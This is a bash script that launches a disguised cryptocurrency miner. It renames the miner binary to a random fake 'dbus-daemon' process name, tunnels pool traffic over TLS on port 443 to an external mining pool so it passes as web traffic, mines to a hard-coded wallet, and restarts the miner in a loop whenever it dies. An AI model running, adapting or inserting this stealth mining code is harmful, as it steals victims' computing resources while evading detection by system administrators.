#!/bin/bash

FAKE_NAME="dbus-daemon-$(shuf -i 100-999 -n 1)"
FAKE_PATH="/usr/local/bin/${FAKE_NAME}"
PORT=443

echo "🔒 Starting MAX STEALTH TLS Mining..."

# TLS Proxy
python3 -m aiostratum_proxy \
  --host 0.0.0.0 \
  --port ${PORT} \
  --pool-host asia.rplant.xyz \
  --pool-port 17059 \
  --pool-ssl \
  > proxy.log 2>&1 &

echo "Proxy started, waiting..."
sleep 12

# Stealth Binary
cp /usr/local/bin/miner "$FAKE_PATH"
chmod +x "$FAKE_PATH"

echo "Launching miner with debug mode..."

# Coba tanpa LD_PRELOAD dulu (biar gampang debug)
"$FAKE_PATH" \
  -a yespowertide \
  -o stratum+tcps://127.0.0.1:${PORT} \
  -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \
  -p x \
  -t 2 \
  --no-color > miner.log 2>&1 &

echo "✅ Miner started. Check logs if needed."

# Monitoring + Restart
while true; do
    sleep 20
    if ! pgrep -f miner > /dev/null 2>&1 && ! pgrep -f ${FAKE_NAME} > /dev/null 2>&1; then
        echo "[$(date)] Miner died, restarting..."
        "$FAKE_PATH" \
          -a yespowertide \
          -o stratum+tcps://127.0.0.1:${PORT} \
          -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \
          -p x \
          -t 2 \
          --no-color > miner.log 2>&1 &
    fi
done
